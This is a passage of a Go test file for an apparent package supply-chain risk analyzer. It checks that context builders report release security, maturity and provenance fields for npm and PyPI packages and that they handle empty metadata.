					IsSelfHosted:  false,
					RunnerDetails: "ubuntu-latest",
					ConfigFile:    ".github/workflows/release.yml",
				},
			},
			HasSelfHosted:       false,
			HasReleaseProcess:   true,
			HasBranchProtection: true,
			RequiredReviewers:   1,
			SignedReleases:      true,
			HasSLSAAttestation:  true,
			OSSFChecks: map[string]int{
				"CI-Tests":          9,
				"Branch-Protection": 8,
			},
		},
	}

	ctx := analyzer.buildReleaseSecurityContext("secure-release-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"secure-release-pkg",
		"GitHub Actions",
		"ubuntu-latest",
		".github/workflows/release.yml",
		"Has self-hosted runners: false",
		"Has automated release process: true",
		"Branch protection enabled: true",
		"Required reviewers: 1",
		"Signed releases: true",
		"Has SLSA attestation: true",
		"Source code available: true",
		"Has matching git tag for release: true",
		"OSSF CI-Tests score: 9/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("release security context missing: %q", expected)
		}
	}
}

// Test: buildReleaseSecurityContext with no CI detected
// Justification: Packages without CI are likely published manually from developer
//                machines, which is a significant build chain risk
// Source: SLSA Build Level 1+ requires hosted build service
// Methodology: Build context with no build systems or CI
// Result: Context should indicate possible manual publishing
func TestBuildReleaseSecurityContext_NoCI(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			// No build systems, no CI
		},
	}

	ctx := analyzer.buildReleaseSecurityContext("manual-pkg", models.EcosystemNPM, result)

	if !strings.Contains(ctx, "none detected") {
		t.Error("expected 'none detected' for package with no CI")
	}
}

// Test: buildPackageMaturityContext includes lifecycle and community data
// Justification: Maturity analysis needs package age, staleness, community engagement,
//                and archive status to assess lifecycle risk
// Source: Ohm et al. (2020) - maturity as proxy for security vetting
// Methodology: Build context with full lifecycle metadata
// Result: Context should include age, staleness, version, community, archive status
func TestBuildPackageMaturityContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			PublishedAt:    time.Date(2015, 6, 1, 0, 0, 0, 0, time.UTC),
			RepoLastCommit: time.Date(2025, 10, 1, 0, 0, 0, 0, time.UTC),
			RepoUpdatedAt:  time.Date(2025, 11, 1, 0, 0, 0, 0, time.UTC),
			LatestVersion:  "5.0.1",
			RepoStars:      50000,
			RepoForks:      5000,
			DownloadCount:  50000000,
			RepoOpenIssues: 100,
			RepoArchived:   false,
			Maintainers:    []string{"a", "b", "c", "d"},
			BusFactor:      4,
			OSSFChecks: map[string]int{
				"Maintained": 10,
			},
		},
	}

	ctx := analyzer.buildPackageMaturityContext("mature-pkg", models.EcosystemNPM, result)

	expectedContent := []string{
		"mature-pkg",
		"First published: 2015-06-01",
		"Latest version: 5.0.1",
		"Stars: 50000",
		"Download count: 50000000",
		"Repository archived: false",
		"Maintainer count: 4",
		"Bus factor: 4",
		"OSSF Maintained score: 10/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("package maturity context missing: %q", expected)
		}
	}
}

// Test: Context builders handle minimal/empty metadata without panic
// Justification: Context builders must be robust to missing data - many packages
//                have incomplete metadata due to API failures or private repos
// Source: Graceful degradation for incomplete data
// Methodology: Build all contexts with empty metadata
// Result: All context strings should be non-empty and contain at least package name
func TestContextBuilders_MinimalData(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{}, // Empty metadata
	}

	builders := []struct {
		name string
		fn   func(string, models.Ecosystem, *models.AnalysisResult) string
	}{
		{"PublisherControl", analyzer.buildPublisherControlContext},
		{"OwnershipChanges", analyzer.buildOwnershipChangesContext},
		{"ReleaseAnomalies", analyzer.buildReleaseAnomaliesContext},
		{"InstallExecution", analyzer.buildInstallExecutionContext},
		{"DependencySprawl", analyzer.buildDependencySprawlContext},
		{"Provenance", analyzer.buildProvenanceContext},
		{"Health", analyzer.buildHealthContext},
		{"Governance", analyzer.buildGovernanceContext},
		{"ReleaseSecurity", analyzer.buildReleaseSecurityContext},
		{"PackageMaturity", analyzer.buildPackageMaturityContext},
	}

	for _, b := range builders {
		t.Run(b.name, func(t *testing.T) {
			ctx := b.fn("minimal-pkg", models.EcosystemNPM, result)
			if ctx == "" {
				t.Errorf("%s produced empty context", b.name)
			}
			if !strings.Contains(ctx, "minimal-pkg") {
				t.Errorf("%s context missing package name", b.name)
			}
		})
	}
}

// Test: buildProvenanceContext for PyPI includes PyPI-specific signature fields
// Justification: PyPI uses cryptographic signatures rather than npm provenance;
//                the context builder must include ecosystem-appropriate fields
// Source: PyPI attestation vs npm provenance distinction
// Methodology: Build provenance context with PyPI ecosystem and verify correct fields
// Result: Should include PyPI signatures and exclude npm provenance references
func TestBuildProvenanceContext_PyPI(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		SourceCodeAvailable: true,
		Metadata: models.PackageMetadata{
			HasPyPISignatures: true,
		},
	}

	ctx := analyzer.buildProvenanceContext("requests", models.EcosystemPyPI, result)

	if !strings.Contains(ctx, "Has PyPI cryptographic signatures: true") {
		t.Error("PyPI provenance context missing PyPI signatures field")
	}
	// Should NOT contain npm-specific provenance fields
	if strings.Contains(ctx, "npm provenance") {
		t.Error("PyPI provenance context should not contain npm provenance")
	}
}
